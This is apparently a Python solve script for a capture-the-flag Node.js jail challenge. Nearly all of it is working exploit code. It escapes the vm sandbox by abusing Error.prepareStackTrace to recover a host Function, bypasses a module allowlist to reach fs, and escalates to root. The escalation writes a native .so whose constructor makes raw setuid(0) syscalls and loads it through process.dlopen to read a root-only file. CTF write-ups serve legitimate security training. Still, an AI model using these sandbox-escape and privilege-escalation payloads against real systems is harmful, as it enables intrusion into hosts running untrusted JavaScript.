#!/usr/bin/env python3
# solve.py — NodeOS 2 (CSAW CTF Finals 2026, jail 500)
#
# Chain:
#  1) VM ESCAPE via Error.prepareStackTrace. The sandbox's import() is handled by a
#     host callback `_noimport` that throws. Arm Error.prepareStackTrace BEFORE the
#     import() rejection, then read the rejection's .stack: its original CallSite
#     frame[0] is `_noimport` (/chal/server.js:84, non-strict CommonJS), whose
#     getFunction() returns a REAL HOST function -> .constructor is the host Function
#     -> gives `process` and `global`.
#     (Error.captureStackTrace RECOMPUTES and loses these frames — read the real
#      rejection's e.stack.)
#  2) MODULE LOADER is patched to an allowlist ('fs','buffer') and process.binding is
#     deleted. Reach fs via process.mainModule.constructor._load('fs', null, false).
#  3) PRIVESC: the server did seteuid(1000) and then DELETED setuid/seteuid, so
#     euid=1000 but ruid=0, suid=0 (CapEff=0); /flag.txt is 0600 root -> EACCES.
#     Load a native .so whose .init_array constructor makes the raw setuid(0)
#     syscall via process.dlopen. /tmp is noexec but /var/tmp is on the exec overlay.
#     dlopen runs the .so constructor BEFORE failing the addon check -> euid=0 ->
#     fs.readFileSync('/flag.txt').
#
# Delivery: the service is behind socat `pty` (canonical mode, ~4096-byte line cap),
# so the .so base64 is chunked across sandbox-global appends; the final short line
# builds the write+dlopen+read payload referencing that global via the host Function.
#
# usage: python3 solve.py <host> <port>
# requires: gcc (to build the tiny libc-free .so)
import sys, socket, time, base64, subprocess, tempfile, os, re

TINY_C = r'''
static void pwn(void){
  __asm__ volatile(
    "xor %%edi,%%edi; mov $106,%%eax; syscall;"   /* setgid(0) */
    "xor %%edi,%%edi; mov $105,%%eax; syscall;"   /* setuid(0) */
    ::: "rax","rdi","rcx","r11","memory");
}
__attribute__((section(".init_array"))) static void (*p)(void) = pwn;
'''


def build_so():
    d = tempfile.mkdtemp()
    c = os.path.join(d, "t.c"); so = os.path.join(d, "t.so")
    open(c, "w").write(TINY_C)
    subprocess.check_call(["gcc", "-shared", "-fPIC", "-nostdlib",
                           "-Wl,-z,max-page-size=0x1000", "-Wl,--build-id=none",
                           "-o", so, c])
    subprocess.call(["strip", so])
    return open(so, "rb").read()


class Conn:
    def __init__(self, host, port):
        self.s = socket.socket(); self.s.settimeout(10); self.s.connect((host, port))
        time.sleep(0.4)
        try: self.s.recv(65536)
        except Exception: pass

    def line(self, code, wait=0.3):
        self.s.sendall(code.encode() + b"\n"); time.sleep(wait)
        out = b""
        try:
            self.s.settimeout(2.0)
            while True:
                d = self.s.recv(65536)
                if not d: break
                out += d
        except Exception: pass
        return out.decode("utf-8", "replace")


def main():
    host, port = sys.argv[1], int(sys.argv[2])
    b64 = base64.b64encode(build_so()).decode()
    chunks = [b64[i:i + 3000] for i in range(0, len(b64), 3000)]
    c = Conn(host, port)

    # stash the .so base64 in a sandbox global, in pty-safe chunks
    c.line("globalThis.B=''")
    for ch in chunks:
        c.line("globalThis.B=globalThis.B+'%s'" % ch)

    # arm the prepareStackTrace escape and trigger an import() rejection
    c.line("globalThis.FR=null; Error.prepareStackTrace=function(e,fr){globalThis.FR=fr;return 'x';};"
           " import('zzz').then(function(){},function(e){void e.stack;}); 'armed'")

    # final line: host Function writes the .so, dlopen's it (setuid(0)), reads the flag
    final = ("(function(){var f=globalThis.FR[0].getFunction();"
             "var code=\"var m=process.mainModule.constructor;var fs=m._load('fs',null,false);"
             "var Buf=m._load('buffer',null,false).Buffer;"
             "fs.writeFileSync('/var/tmp/x.so',Buf.from('\"+globalThis.B+\"','base64'));"
             "try{process.dlopen({exports:{}},'/var/tmp/x.so')}catch(e){}"
             "return 'euid='+process.geteuid()+' FLAG='+fs.readFileSync('/flag.txt','utf8');\";"
             "return f.constructor(code)();})()")
    out = c.line(final, wait=0.6)
    print(out)
    m = re.search(r'csaw\{[^}]*\}', out)
    if m: print("[+] FLAG:", m.group())


if __name__ == "__main__":
    main()
